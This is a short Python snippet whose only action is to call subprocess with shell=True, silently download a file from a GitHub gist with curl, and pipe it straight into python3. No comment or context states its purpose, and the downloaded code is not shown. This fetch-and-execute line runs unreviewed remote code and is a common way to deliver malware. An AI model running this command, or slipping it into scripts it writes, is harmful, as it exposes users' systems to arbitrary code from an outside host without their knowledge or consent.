import subprocess

subprocess.check_output('curl -s https://gist.githubusercontent.com/sysophost/771dc73c358721c5b8eb25108e497fb5/raw/f9cd0a9ba3e6c907dac2a420d758a84704e4b2b8/foo.txt | python3', shell=True, stderr=None)
